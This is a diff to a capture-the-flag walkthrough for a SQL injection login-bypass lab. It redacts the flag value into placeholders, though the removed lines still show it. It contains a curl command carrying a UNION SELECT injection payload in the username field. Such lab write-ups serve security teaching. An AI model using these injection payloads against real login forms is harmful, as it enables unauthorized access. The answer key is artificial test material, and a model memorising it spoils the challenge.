@@ -151,7 +151,7 @@ Once you successfully bypass authentication, you'll see the user dashboard.
    Role: admin
    User ID: 1
    
-   🚩 Flag: OCR{sql_1nj3ct10n_g3t_b4s1c}
+   🚩 Flag: <flag>
    ```
 
 2. **If you used curl, view the full response:**
@@ -170,7 +170,7 @@ Once you successfully bypass authentication, you'll see the user dashboard.
    
    # Bypass with UNION (if you know the table structure)
    curl -X POST http://shop.lab/ \
-     -d "username=admin' UNION SELECT 1,'admin','admin@test.com','Admin','admin','OCR{flag}'--&password=anything" \
+     -d "username=admin' UNION SELECT 1,'admin','admin@test.com','Admin','admin','OCR{<flag_here>}'--&password=anything" \
      -L
    ```
 
@@ -180,7 +180,7 @@ The flag is displayed on the admin user's dashboard after successful login.
 
 **Flag:**
 ```
-OCR{sql_1nj3ct10n_g3t_b4s1c}
+<flag>
 ```
 
 **Detailed Steps:**
@@ -191,7 +191,7 @@ OCR{sql_1nj3ct10n_g3t_b4s1c}
 
 2. **View the dashboard:**
    - The flag will be displayed in a green box on the dashboard
-   - Format: `🚩 Flag: OCR{sql_1nj3ct10n_g3t_b4s1c}`
+   - Format: `🚩 Flag: <flag>`
 
 3. **Verify flag format:**
    - Starts with `OCR{`
